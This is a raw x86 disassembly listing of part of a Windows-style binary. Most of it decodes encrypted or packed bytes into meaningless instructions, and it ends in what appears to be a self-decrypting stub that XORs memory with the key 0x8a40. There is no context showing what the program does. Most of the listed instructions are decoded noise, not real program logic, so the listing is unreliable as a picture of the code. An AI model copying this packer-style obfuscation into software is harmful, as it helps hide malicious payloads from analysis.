  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	imul   BYTE PTR [eax]
  403083:	jb     0x4030d8
  403085:	lods   eax,DWORD PTR ds:[esi]
  403086:	mov    gs,ebp
  403088:	cmp    DWORD PTR [esi+0x63],esi
  40308b:	jg     0x4030b4
  40308d:	xchg   esp,eax
  40308e:	inc    edi
  40308f:	shl    DWORD PTR [ebp-0x2],cl
  403092:	mov    dh,0x91
  403094:	loope  0x40307a
  403096:	lods   al,BYTE PTR ds:[esi]
  403097:	arpl   di,si
  403099:	out    0xc,eax
  40309b:	cmp    DWORD PTR [bp+si-0x607a],ebx
  4030a0:	fist   DWORD PTR [esi]
  4030a2:	jo     0x4030cc
  4030a4:	and    eax,0x44371e63
  4030a9:	lea    ebp,[eax+0xe2fdd06]
  4030af:	mov    dl,bh
  4030b1:	stc    
  4030b2:	or     al,0xd0
  4030b4:	mov    esi,0x76aa7e27
  4030b9:	or     dh,BYTE PTR [eax-0x6ee4e6ab]
  4030bf:	and    edx,0x16236e9d
  4030c5:	ds dec ecx
  4030c7:	and    DWORD PTR [ebx+0x53f5ce46],0x316700ca
  4030d1:	call   0xff09b02e
  4030d6:	xchg   ebp,eax
  4030d7:	test   DWORD PTR [edx+0x5947b69],eax
  4030dd:	sub    ebx,DWORD PTR [edx+0x77da40d0]
  4030e3:	imul   edx,DWORD PTR [eax-0x2ef95ea6],0x7c
  4030ea:	leave  
  4030eb:	ret    
  4030ec:	ret    
  4030ed:	jl     0x4030ec
  4030ef:	or     edx,DWORD PTR [edx+eiz*8]
  4030f2:	jae    0x4030b8
  4030f4:	ds mov fs,esp
  4030f7:	out    0x88,al
  4030f9:	inc    ecx
  4030fa:	push   ebx
  4030fb:	fistp  QWORD PTR [esi+esi*4-0x37bb9869]
  403102:	cwde   
  403103:	push   edi
  403104:	into   
  403105:	mov    al,ds:0x682260e3
  40310a:	repz add edx,0xf82a1a9b
  403111:	push   ds
  403112:	mov    WORD PTR [ecx-0x3f],fs
  403115:	cmc    
  403116:	scas   eax,DWORD PTR es:[edi]
  403117:	fprem1 
  403119:	stc    
  40311a:	fsubr  st,st(4)
  40311c:	jne    0x4030a3
  40311e:	lods   al,BYTE PTR ds:[esi]
  40311f:	sub    dl,BYTE PTR [edx+0x43f011b3]
  403125:	and    BYTE PTR [ebx+0x2dcd5850],dh
  40312b:	adc    BYTE PTR [eax+ebx*2],0xa
  40312f:	pop    esp
  403130:	out    0x1,eax
  403132:	mov    ds:0xc0534d1f,al
  403137:	(bad)  
  403138:	rcr    ah,cl
  40313a:	dec    ebx
  40313b:	ins    BYTE PTR es:[di],dx
  40313d:	dec    esi
  40313e:	xchg   edi,eax
  40313f:	push   esi
  403140:	pop    ebp
  403141:	dec    edi
  403142:	xchg   cl,al
  403144:	in     al,0x47
  403146:	in     al,dx
  403147:	mov    ebx,0xce84e25c
  40314c:	adc    esp,DWORD PTR [edi]
  40314e:	and    DWORD PTR [ecx+0x45],ecx
  403151:	shr    BYTE PTR [ebp+0x35c0ef1b],1
  403157:	xor    esp,DWORD PTR [ecx+0x27]
  40315a:	fwait
  40315b:	push   edi
  40315c:	sbb    DWORD PTR [ecx+ebx*4+0x1c88a81d],eax
  403163:	imul   ebx,DWORD PTR [ecx+0x791b152],0xe071122a
  40316d:	pop    ds
  40316e:	dec    ebx
  40316f:	addr16 pop ebp
  403171:	je     0x403128
  403173:	jg     0x4031a8
  403175:	dec    esi
  403176:	fwait
  403177:	and    bh,BYTE PTR [edi]
  403179:	in     al,0x93
  40317b:	into   
  40317c:	push   ss
  40317d:	popf   
  40317e:	ins    BYTE PTR es:[edi],dx
  40317f:	xchg   edi,eax
  403180:	das    
  403181:	in     al,dx
  403182:	xchg   ebx,eax
  403183:	jne    0x403141
  403185:	xor    al,0x29
  403187:	push   ds
  403188:	leave  
  403189:	mov    al,ds:0x37e20325
  40318e:	fsubrp st(4),st
  403190:	ret    0xf63c
  403193:	mov    eax,ds:0x15910a9d
  403198:	push   edx
  40319a:	mov    ds:0x4874c34c,eax
  40319f:	lods   al,BYTE PTR ds:[esi]
  4031a0:	cwde   
  4031a1:	xor    bh,BYTE PTR [edx+0x7e56e627]
  4031a7:	pop    ebp
  4031a8:	mov    dh,0x26
  4031aa:	xchg   BYTE PTR [esi-0x12],dh
  4031ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ae:	popa   
  4031af:	int    0x7b
  4031b1:	and    eax,0xe64b3583
  4031b6:	jbe    0x4031cd
  4031b8:	cmp    al,BYTE PTR [edx-0x278e30f5]
  4031be:	inc    ebp
  4031bf:	dec    esp
  4031c0:	es fadd st,st(7)
  4031c3:	push   ecx
  4031c4:	jl     0x403198
  4031c6:	ins    BYTE PTR es:[edi],dx
  4031c7:	les    edx,FWORD PTR [ebx-0x16a91854]
  4031cd:	fwait
  4031ce:	inc    ebp
  4031cf:	xchg   edx,eax
  4031d0:	dec    edi
  4031d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d2:	inc    esp
  4031d3:	cwde   
  4031d4:	adc    BYTE PTR [ecx],dh
  4031d6:	adc    eax,DWORD PTR ds:[eax]
  4031d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031da:	lods   al,BYTE PTR ds:[esi]
  4031db:	popa   
  4031dc:	mov    al,dl
  4031de:	jl     0x4031b3
  4031e0:	in     eax,0x33
  4031e2:	and    al,0xeb
  4031e4:	(bad)  
  4031e5:	pusha  
  4031e6:	inc    ebp
  4031e7:	lods   eax,DWORD PTR ds:[esi]
  4031e8:	and    al,0x8b
  4031ea:	mov    dl,ah
  4031ec:	xor    al,0xa2
  4031ee:	and    al,0x35
  4031f0:	mov    esp,0xa81cd105
  4031f5:	push   ebp
  4031f6:	push   esi
  4031f7:	js     0x4031e3
  4031f9:	jecxz  0x40321b
  4031fb:	ins    BYTE PTR es:[edi],dx
  4031fc:	push   edx
  4031fd:	fs jbe 0x4031f7
  403200:	push   ebx
  403201:	xor    ebx,DWORD PTR [eax-0x4]
  403204:	jp     0x403220
  403206:	xor    bh,BYTE PTR [ebx-0x65]
  403209:	xlat   BYTE PTR ds:[ebx]
  40320a:	nop
  40320b:	outs   dx,DWORD PTR ds:[esi]
  40320c:	pop    ebp
  40320d:	in     eax,dx
  40320e:	popf   
  40320f:	push   ebp
  403210:	ret    
  403211:	and    dh,ah
  403213:	ins    DWORD PTR es:[edi],dx
  403214:	arpl   WORD PTR [eax-0x41],bx
  403217:	pusha  
  403218:	cmp    al,cl
  40321a:	enter  0xc7fb,0xf1
  40321e:	mov    dh,dl
  403220:	call   0x8378e505
  403225:	cdq    
  403226:	nop
  403227:	xchg   ebx,eax
  403228:	xor    eax,0x24778f2
  40322d:	jns    0x40326d
  40322f:	push   ds
  403230:	popa   
  403231:	sbb    BYTE PTR [eax+0x27],bh
  403234:	iret   
  403235:	cmp    eax,0xc0bb729d
  40323a:	xchg   esi,eax
  40323b:	sbb    bh,dh
  40323d:	push   0xc5e3c663
  403242:	(bad)  
  403243:	jmp    FWORD PTR [eax+0x5deca2f8]
  403249:	out    dx,eax
  40324a:	sbb    bh,BYTE PTR [ecx]
  40324c:	stos   DWORD PTR es:[edi],eax
  40324d:	xchg   DWORD PTR [eax],ebx
  40324f:	pop    eax
  403250:	or     al,0x63
  403252:	loop   0x403206
  403254:	xchg   bl,bh
  403256:	cmp    BYTE PTR [eax],0x60
  403259:	dec    esp
  40325a:	jbe    0x4031dc
  40325c:	xchg   ecx,eax
  40325d:	jle    0x4031e5
  40325f:	sub    dl,BYTE PTR [ebx+0x79da60ed]
  403265:	jmp    0xc766f2da
  40326a:	mov    ?,WORD PTR [ebx]
  40326c:	in     al,dx
  40326d:	lahf   
  40326e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40326f:	ret    
  403270:	lock fisttp QWORD PTR [ecx+edi*4]
  403274:	mov    ecx,0xec424011
  403279:	and    eax,esp
  40327b:	fld    QWORD PTR [edx+0xb80c3a]
  403281:	xor    BYTE PTR [ebx+0x24],0x69
  403285:	mov    bl,0x33
  403287:	add    eax,0xaacea4a
  40328c:	sbb    BYTE PTR ds:0x2416,ch
  403291:	xchg   edx,eax
  403292:	xor    BYTE PTR [edi+ecx*1-0x26],bl
  403296:	and    al,0x50
  403298:	jecxz  0x403253
  40329a:	inc    edx
  40329b:	push   edi
  40329c:	add    BYTE PTR [edx],bh
  40329e:	jle    0x403260
  4032a0:	sbb    BYTE PTR [edx],al
  4032a2:	sub    BYTE PTR [edx],ah
  4032a4:	pop    eax
  4032a5:	add    BYTE PTR [ebp-0x1ce0f5d7],0x31
  4032ac:	jns    0x403233
  4032ae:	(bad)  
  4032af:	cmp    esp,ecx
  4032b1:	iret   
  4032b2:	fdivr  st(7),st
  4032b4:	outs   dx,DWORD PTR ds:[esi]
  4032b5:	inc    esi
  4032b6:	mov    ch,0x5
  4032b8:	jne    0x4032c5
  4032ba:	popf   
  4032bb:	sbb    edi,ebp
  4032bd:	and    BYTE PTR ds:0xd206697c,cl
  4032c3:	fisubr WORD PTR [ebp-0x241cfcc8]
  4032c9:	add    BYTE PTR [ebx+0x6b],bl
  4032cc:	cmp    al,BYTE PTR [ecx+0x79]
  4032cf:	call   0x44ab:0xe0f87619
  4032d6:	pop    ds
  4032d7:	fsubr  DWORD PTR ds:0x310583c2
  4032dd:	adc    al,0x3b
  4032df:	sub    eax,0xaa2b7d08
  4032e4:	jge    0x403361
  4032e6:	pusha  
  4032e7:	xchg   BYTE PTR [eax-0x5bae6579],dh
  4032ed:	pop    edi
  4032ee:	adc    eax,0x78fe9ffc
  4032f3:	mov    ah,0x2e
  4032f5:	pop    ds
  4032f6:	int3   
  4032f7:	xor    bh,BYTE PTR [ebx+0x72]
  4032fa:	rcl    BYTE PTR [esi+edi*2-0x7e],0x39
  4032ff:	jmp    0x15fe8cd1
  403304:	stos   BYTE PTR es:[edi],al
  403305:	repnz sub eax,0x8fc235ef
  40330b:	or     dl,0x4a
  40330e:	cld    
  40330f:	mov    ch,0x37
  403311:	imul   eax,DWORD PTR [esi],0x40ac11be
  403317:	cli    
  403318:	add    al,0xe1
  40331a:	sub    DWORD PTR [edi],esi
  40331c:	push   edx
  40331d:	lds    esp,FWORD PTR fs:[ebx-0x361ced5a]
  403324:	jns    0x40330d
  403326:	jl     0x40338f
  403328:	aad    0x7
  40332a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332b:	sbb    DWORD PTR [eax+0x10],ebx
  40332e:	es push ebp
  403330:	cmp    DWORD PTR [edx],ebp
  403332:	cmp    al,0x4a
  403334:	popf   
  403335:	push   dx
  403337:	imul   ecx,DWORD PTR [edi-0x72a7c620],0xffffff9c
  40333e:	add    eax,0x149701a1
  403343:	clc    
  403344:	and    esi,ebp
  403346:	sbb    eax,DWORD PTR [esi+ecx*4]
  403349:	ja     0x403371
  40334b:	inc    edi
  40334c:	mov    dl,0x59
  40334e:	add    al,0xc5
  403350:	mov    al,0x8b
  403352:	jle    0x4033c7
  403354:	mov    esi,0x563c33a9
  403359:	push   eax
  40335a:	xor    al,BYTE PTR [edx+eax*1]
  40335d:	or     esp,edi
  40335f:	out    dx,eax
  403360:	inc    ecx
  403361:	pop    ebx
  403362:	in     al,dx
  403363:	fidiv  DWORD PTR ds:0xcf56e7f2
  403369:	and    ecx,ebx
  40336b:	cmp    eax,0x797404b6
  403370:	stos   BYTE PTR es:[edi],al
  403371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403372:	outs   dx,DWORD PTR ds:[esi]
  403373:	mov    eax,0x4d450cdb
  403378:	push   esp
  403379:	jmp    FWORD PTR [edx+0x56]
  40337c:	xchg   esi,esp
  40337e:	es push ebp
  403380:	test   eax,esp
  403382:	sar    al,cl
  403384:	fnstsw WORD PTR [eax]
  403386:	scas   al,BYTE PTR es:[edi]
  403387:	cmp    BYTE PTR [ecx-0x4c],dh
  40338a:	retf   0xffce
  40338d:	pop    ebx
  40338e:	fs mov al,ch
  403391:	(bad)
  403394:	sub    esi,DWORD PTR [ecx-0x2]
  403397:	data16 xlat BYTE PTR ds:[ebx]
  403399:	out    0x70,eax
  40339b:	rcl    DWORD PTR [esi+0x4f],1
  40339e:	fst    QWORD PTR [eax]
  4033a0:	push   0xffffff88
  4033a2:	popa   
  4033a3:	dec    DWORD PTR [esi-0x3fc369b1]
  4033a9:	xchg   ah,bl
  4033ab:	and    ah,bh
  4033ad:	xor    DWORD PTR [ebx-0x3ccf9022],ecx
  4033b3:	lahf   
  4033b4:	sub    eax,0xc686d5dd
  4033b9:	sbb    ch,BYTE PTR [esi+edx*4+0x5a]
  4033bd:	dec    edx
  4033be:	mov    ch,0xf7
  4033c0:	retf   
  4033c1:	xor    ch,al
  4033c3:	in     al,0x4c
  4033c5:	outs   dx,BYTE PTR ds:[esi]
  4033c6:	sbb    eax,0xa636b5f3
  4033cb:	out    0x3f,al
  4033cd:	adc    al,cl
  4033cf:	test   eax,ecx
  4033d1:	push   ebx
  4033d2:	mov    ds:0xdff812f6,eax
  4033d7:	das    
  4033d8:	mov    edx,0x6d96c41
  4033dd:	in     al,dx
  4033de:	cli    
  4033df:	xlat   BYTE PTR ds:[ebx]
  4033e0:	popa   
  4033e1:	mov    eax,cs
  4033e3:	bound  esi,QWORD PTR [ecx+0x30]
  4033e6:	int3   
  4033e7:	ret    
  4033e8:	shr    ebx,cl
  4033ea:	push   eax
  4033eb:	fs fldl2e 
  4033ee:	std    
  4033ef:	pop    ds
  4033f0:	test   eax,0x6d0ccba7
  4033f5:	pop    es
  4033f6:	ss xchg esp,eax
  4033f8:	sbb    DWORD PTR [esi-0x1242520],edi
  4033fe:	aaa    
  4033ff:	xchg   ecx,eax
  403400:	sbb    eax,DWORD PTR [ecx]
  403402:	and    eax,0xace8b1ea
  403407:	lahf   
  403408:	rcl    DWORD PTR [ecx],0xc8
  40340b:	push   edi
  40340c:	jb     0x40339b
  40340e:	adc    dl,BYTE PTR [esi-0x77e1a87a]
  403414:	or     DWORD PTR [ebx+0x3f8b087d],ecx
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	mov    bl,0x43
  403435:	out    0xa0,eax
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	mul    BYTE PTR [edi+0x50c0d46e]
  403445:	dec    esp
  403446:	cdq    
  403447:	(bad)  
  403448:	sbb    ecx,DWORD PTR [ebx-0x4580e228]
  40344e:	in     al,dx
  40344f:	or     BYTE PTR [ebp+0x2ddc0795],ah
  403455:	dec    eax
  403456:	in     eax,dx
  403457:	mov    ah,0x4b
  403459:	and    edx,eax
  40345b:	jp     0x403433
  40345d:	test   ah,dl
  40345f:	sbb    eax,edx
  403461:	or     al,0x46
  403463:	sbb    al,0x12
  403465:	sbb    al,0xad
  403467:	push   eax
  403468:	xor    al,0x76
  40346a:	xor    al,0x8a
  40346c:	cmp    bh,BYTE PTR [esi+eiz*2]
  40346f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403470:	sub    eax,0x5f5e3c0f
  403475:	jecxz  0x403414
  403477:	sub    BYTE PTR [esi],bl
  403479:	pop    esp
  40347a:	stos   DWORD PTR es:[edi],eax
  40347b:	xor    edi,edi
  40347d:	cmp    ecx,esp
  40347f:	cmp    al,0xd6
  403481:	add    al,0x80
  403483:	cmc    
  403484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403485:	jle    0x403427
  403487:	cs addr16 xchg esp,eax
  40348a:	jp     0x403472
  40348c:	adc    BYTE PTR [edi-0x7d],dh
  40348f:	scas   al,BYTE PTR es:[edi]
  403490:	jl     0x4034cd
  403492:	mov    ebp,0x3673522a
  403497:	mov    bl,0x5
  403499:	xor    ch,BYTE PTR [ebp+0x41]
  40349c:	sbb    ch,BYTE PTR [ebx-0x47fc5233]
  4034a2:	jl     0x40346d
  4034a4:	inc    esi
  4034a5:	sbb    eax,DWORD PTR [esi]
  4034a7:	inc    ebx
  4034a8:	ds addr16 loopne 0x40342f
  4034ac:	cmp    cl,ah
  4034ae:	sar    DWORD PTR [edx],0xd0
  4034b1:	jb     0x40343a
  4034b3:	or     BYTE PTR [ebp-0x54],0xb4
  4034b7:	sbb    bl,BYTE PTR [eax+0x571e9041]
  4034bd:	adc    DWORD PTR [edi+0x5b],ecx
  4034c0:	adc    eax,edx
  4034c2:	(bad)  
  4034c3:	outs   dx,BYTE PTR ds:[esi]
  4034c4:	jl     0x40347f
  4034c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034c7:	sub    al,0xe
  4034c9:	(bad)  
  4034ca:	stc    
  4034cb:	(bad)
  4034d0:	add    DWORD PTR [edx],ecx
  4034d2:	rcl    ecx,1
  4034d4:	iret   
  4034d5:	fdiv   QWORD PTR [ebp+0xd]
  4034d8:	call   0xcdeb21ae
  4034dd:	mov    dh,0x6
  4034df:	mov    al,ah
  4034e1:	aaa    
  4034e2:	repnz int3 
  4034e4:	fwait
  4034e5:	mov    eax,0x931ab0
  4034ea:	cmp    edx,DWORD PTR [eax+0x41c087c]
  4034f0:	xor    eax,DWORD PTR [edx+eiz*2]
  4034f3:	cld    
  4034f4:	and    ebp,DWORD PTR [ecx]
  4034f6:	aam    0x4f
  4034f8:	xor    eax,0x55b2d9e3
  4034fd:	dec    ecx
  4034fe:	aam    0x6f
  403500:	das    
  403501:	bound  edi,QWORD PTR [edi]
  403503:	pop    ebx
  403504:	fcom   DWORD PTR [ecx]
  403506:	(bad)  
  403507:	aas    
  403508:	leave  
  403509:	sub    al,0xa0
  40350b:	cmp    edx,DWORD PTR [ebp-0x45]
  40350e:	push   esi
  40350f:	push   ds
  403510:	dec    ecx
  403511:	xchg   BYTE PTR [edi-0x4777e4f8],dh
  403517:	hlt    
  403518:	add    eax,0x5e247622
  40351d:	fs iret 
  40351f:	and    al,0x35
  403521:	ret    
  403522:	stos   BYTE PTR es:[edi],al
  403523:	jne    0x40351e
  403525:	and    eax,0x67f2bba2
  40352a:	cmp    ebx,ebx
  40352c:	rcl    DWORD PTR [ebx],1
  40352e:	push   eax
  40352f:	mov    edi,0xafeae5af
  403534:	out    0x95,al
  403536:	push   ebp
  403537:	push   0x62
  403539:	xlat   BYTE PTR ds:[ebx]
  40353a:	mov    ah,0xad
  40353c:	fwait
  40353d:	sub    ch,BYTE PTR [ecx]
  40353f:	ss das 
  403541:	sar    BYTE PTR [ecx],cl
  403543:	lods   al,BYTE PTR ds:[esi]
  403544:	pop    ss
  403545:	inc    edx
  403546:	(bad)  
  403547:	push   ebx
  403548:	and    BYTE PTR [ebx+0x7a06c30d],dh
  40354e:	adc    ah,BYTE PTR [ecx]
  403550:	dec    eax
  403551:	daa    
  403552:	rol    BYTE PTR [ebp+0x4c],1
  403555:	enter  0xab94,0x7a
  403559:	ret    0x8816
  40355c:	ss jp  0x4035b7
  40355f:	xchg   edi,eax
  403560:	mov    ah,0xee
  403562:	xchg   ecx,eax
  403563:	or     dh,bh
  403565:	cmc    
  403566:	pop    ebp
  403567:	adc    ch,BYTE PTR [ecx+0x58]
  40356a:	xor    al,0x85
  40356c:	add    DWORD PTR [ebx+0x5ceaf10],edx
  403572:	jae    0x4035f2
  403574:	std    
  403575:	fs retf 0x2556
  403579:	das    
  40357a:	jne    0x403574
  40357c:	mov    edx,DWORD PTR [ebx]
  40357e:	fild   QWORD PTR [esi]
  403580:	iret   
  403581:	(bad)  
  403582:	sti    
  403583:	jg     0x403590
  403585:	jmp    0x450b:0xe75e1b0
  40358c:	(bad)  
  40358d:	mov    esi,0xd2c3dea9
  403592:	ficomp WORD PTR ds:0xf3e6a22
  403598:	push   ebx
  403599:	std    
  40359a:	pop    esi
  40359b:	call   FWORD PTR [eax-0x46ac4750]
  4035a1:	inc    esp
  4035a2:	add    edx,DWORD PTR [esp+eiz*2]
  4035a5:	jecxz  0x40358f
  4035a7:	push   ecx
  4035a8:	lods   eax,DWORD PTR ds:[esi]
  4035a9:	sub    BYTE PTR [edx-0x9],bl
  4035ac:	xor    DWORD PTR [ecx+0x30],0xffffff9c
  4035b0:	fs xor ecx,0xffffffad
  4035b4:	xor    ch,BYTE PTR [ebx]
  4035b6:	sbb    BYTE PTR [eax-0x7e],ah
  4035b9:	imul   esi,DWORD PTR [ecx+0x37],0xb06a1283
  4035c0:	in     al,0x6d
  4035c2:	xchg   ebp,eax
  4035c3:	dec    edi
  4035c4:	jne    0x403598
  4035c6:	jg     0x403616
  4035c8:	and    cl,BYTE PTR [edi+0xd]
  4035cb:	popf   
  4035cc:	nop
  4035cd:	inc    ecx
  4035ce:	shl    edi,0xc5
  4035d1:	xchg   DWORD PTR [eax+0x57],esi
  4035d4:	outs   dx,BYTE PTR ds:[esi]
  4035d5:	jecxz  0x4035ba
  4035d7:	jb     0x403566
  4035d9:	lock jg 0x403637
  4035dc:	mov    bh,0x5e
  4035de:	stc    
  4035df:	int    0x90
  4035e1:	xor    dl,cl
  4035e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e4:	add    BYTE PTR [ecx-0x58],bl
  4035e7:	cmc    
  4035e8:	lods   al,BYTE PTR ds:[esi]
  4035e9:	dec    esp
  4035ea:	sbb    BYTE PTR [edi],0xf5
  4035ed:	jmp    0x8f2e7986
  4035f2:	and    DWORD PTR [esi+eiz*4],eax
  4035f5:	jecxz  0x4035a3
  4035f7:	paddsw mm3,mm2
  4035fa:	jmp    0xb31ed684
  4035ff:	add    esp,DWORD PTR [edi+0x7d]
  403602:	rcr    DWORD PTR [ebx+0x51054376],0xc2
  403609:	stc    
  40360a:	add    esi,0x13
  40360d:	adc    ah,BYTE PTR [ebx+0x75]
  403610:	xor    esi,DWORD PTR ds:0xa27f1034
  403616:	fwait
  403617:	leave  
  403618:	jne    0x40365d
  40361a:	stos   DWORD PTR es:[edi],eax
  40361b:	cmp    al,0x84
  40361d:	imul   ebx,DWORD PTR [ecx],0xaf61a310
  403623:	inc    edi
  403624:	pop    edx
  403625:	sbb    ecx,ebx
  403627:	arpl   di,bp
  403629:	sahf   
  40362a:	sub    al,0xcc
  40362c:	outs   dx,DWORD PTR ds:[esi]
  40362d:	cmp    ebp,DWORD PTR [eax+0x4061723d]
  403633:	sub    eax,0xe5922f72
  403638:	jp     0x4036a0
  40363a:	leave  
  40363b:	imul   ebp,DWORD PTR [edi-0xea81976],0x99ebd54f
  403645:	(bad)  
  403646:	daa    
  403647:	jb     0x403601
  403649:	push   cs
  40364a:	je     0x4035f6
  40364c:	sub    al,BYTE PTR ds:[ebp+0x25]
  403650:	es stos BYTE PTR es:[edi],al
  403652:	hlt    
  403653:	rol    DWORD PTR [ebx],cl
  403655:	sub    al,0x6b
  403657:	mov    bh,0x2b
  403659:	fs mov ah,0x9b
  40365c:	adc    DWORD PTR [ebx+edi*8-0x546d90a4],esi
  403663:	ja     0x403635
  403665:	jno    0x403687
  403667:	and    eax,0xafe65d17
  40366c:	iret   
  40366d:	das    
  40366e:	jmp    0x7a3f8849
  403673:	xchg   ebp,eax
  403674:	mov    cl,0xf2
  403676:	lea    esi,[esi+eax*1+0x79]
  40367a:	call   0x4666079
  40367f:	push   eax
  403680:	(bad)  
  403681:	dec    ebx
  403682:	pop    edx
  403683:	fwait
  403684:	inc    edx
  403685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403686:	in     al,0x4a
  403688:	mov    al,0xde
  40368a:	dec    eax
  40368b:	test   DWORD PTR [edi],ecx
  40368d:	mov    DWORD PTR [edx-0x2],0xb17f5ad6
  403694:	js     0x403689
  403696:	mov    DWORD PTR [edi+0x33],ecx
  403699:	call   0xf717537c
  40369e:	mov    ah,0xa6
  4036a0:	xchg   ecx,eax
  4036a1:	jb     0x4036f6
  4036a3:	push   ecx
  4036a4:	and    DWORD PTR [eax-0xd],ebp
  4036a7:	lods   eax,DWORD PTR ds:[esi]
  4036a8:	mov    edi,ss
  4036aa:	aam    0xaf
  4036ac:	add    DWORD PTR [edx],0x6a9408e2
  4036b2:	je     0x40367d
  4036b4:	shl    ah,cl
  4036b6:	clc    
  4036b7:	je     0x403660
  4036b9:	push   esp
  4036ba:	push   ss
  4036bb:	outs   dx,DWORD PTR ds:[esi]
  4036bc:	push   es
  4036bd:	dec    esp
  4036be:	shr    BYTE PTR [esi],cl
  4036c0:	ins    BYTE PTR es:[edi],dx
  4036c1:	or     al,0xa0
  4036c3:	jl     0x40367f
  4036c5:	shr    BYTE PTR cs:[ebx+0x23c7be17],1
  4036cc:	mov    ch,0x44
  4036ce:	rcl    dh,cl
  4036d0:	pop    esi
  4036d1:	pusha  
  4036d2:	pop    ebp
  4036d3:	(bad)  
  4036d4:	cld    
  4036d5:	repnz fist WORD PTR [edx]
  4036d8:	dec    esi
  4036d9:	je     0x403732
  4036db:	into   
  4036dc:	call   0x46f5:0x7304c1dc
  4036e3:	aam    0x11
  4036e5:	icebp  
  4036e6:	or     al,0x4d
  4036e8:	and    DWORD PTR [edi],0xfffffff8
  4036eb:	sbb    eax,DWORD PTR [eax-0x1b0dd7d9]
  4036f1:	clc    
  4036f2:	out    dx,al
  4036f3:	inc    ecx
  4036f4:	enter  0xe302,0x50
  4036f8:	sbb    cl,BYTE PTR [edi]
  4036fa:	mov    ds:0xda5c2fd9,eax
  4036ff:	or     ebp,DWORD PTR [esi]
  403701:	sbb    DWORD PTR [ebx],ebx
  403703:	mov    ebx,0x52b335d8
  403708:	push   ds
  403709:	cwde   
  40370a:	stos   BYTE PTR es:[edi],al
  40370b:	pop    esi
  40370c:	in     eax,0x11
  40370e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40370f:	(bad)  
  403710:	adc    bh,BYTE PTR [ebx+0x40]
  403713:	and    bh,BYTE PTR [ecx]
  403715:	and    al,0xbc
  403717:	sahf   
  403718:	popa   
  403719:	pop    ebp
  40371a:	std    
  40371b:	repnz mov ch,0x63
  40371e:	aam    0x51
  403720:	jnp    0x40375f
  403722:	stc    
  403723:	or     ch,BYTE PTR [esp+ebx*2]
  403726:	cmp    eax,DWORD PTR [esi-0x3087aa9a]
  40372c:	je     0x403728
  40372e:	pop    ebx
  40372f:	call   0x1582:0xf84707dc
  403736:	mov    ebp,0xf403fdcb
  40373b:	jl     0x4036cf
  40373d:	lods   al,BYTE PTR ds:[esi]
  40373e:	sahf   
  40373f:	push   ebp
  403740:	or     edx,DWORD PTR [esi+0x3e]
  403743:	icebp  
  403744:	jmp    FWORD PTR [edi-0x5a73686b]
  40374a:	aas    
  40374b:	mov    ah,0x24
  40374d:	mov    ch,0x55
  40374f:	loopne 0x4036e2
  403751:	add    ebx,DWORD PTR [edi-0x330f7e03]
  403757:	mov    dh,0xa1
  403759:	xlat   BYTE PTR ds:[ebx]
  40375a:	inc    edi
  40375b:	ds daa 
  40375d:	shl    eax,1
  40375f:	mov    ecx,0xe8003959
  403764:	lahf   
  403765:	xchg   edx,eax
  403766:	and    ebx,DWORD PTR ds:0x67d69b7d
  40376c:	fxam   
  40376e:	pop    edx
  40376f:	or     DWORD PTR [edi],0x42
  403772:	add    eax,0x9b03ddbc
  403777:	jae    0x4037e9
  403779:	into   
  40377a:	sub    dl,BYTE PTR [eax+0x3d8e642]
  403780:	sbb    DWORD PTR [esi-0x5],ebp
  403783:	imul   eax,DWORD PTR [eax+0x39],0xb
  403787:	aad    0x46
  403789:	icebp  
  40378a:	mov    bl,0xb0
  40378c:	mov    ebp,DWORD PTR [edx-0x6e]
  40378f:	or     ah,dh
  403791:	fist   WORD PTR [si]
  403794:	and    esp,ebx
  403796:	cld    
  403797:	mov    al,0x98
  403799:	fistp  QWORD PTR [ecx-0x6820a586]
  40379f:	scas   eax,DWORD PTR es:[edi]
  4037a0:	cmp    eax,0x2f0c6c0b
  4037a5:	sbb    DWORD PTR [ebx-0x4d],eax
  4037a8:	xchg   ecx,eax
  4037a9:	mov    edx,0xc60d321b
  4037ae:	int    0x44
  4037b0:	and    al,0x41
  4037b2:	(bad)  
  4037b3:	cli    
  4037b4:	add    cl,BYTE PTR [ecx]
  4037b6:	mov    ch,0x9e
  4037b8:	push   edx
  4037b9:	mov    ds:0x2c7f3d7,eax
  4037be:	adc    esp,DWORD PTR [ecx-0x57322215]
  4037c4:	push   cs
  4037c5:	push   0x76
  4037c7:	ss push eax
  4037c9:	in     eax,dx
  4037ca:	js     0x4037d8
  4037cc:	loopne 0x403761
  4037ce:	xchg   DWORD PTR [eax+0x5b],esp
  4037d1:	or     DWORD PTR [ecx],0xffffffba
  4037d4:	push   es
  4037d5:	cmp    eax,DWORD PTR [eax]
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
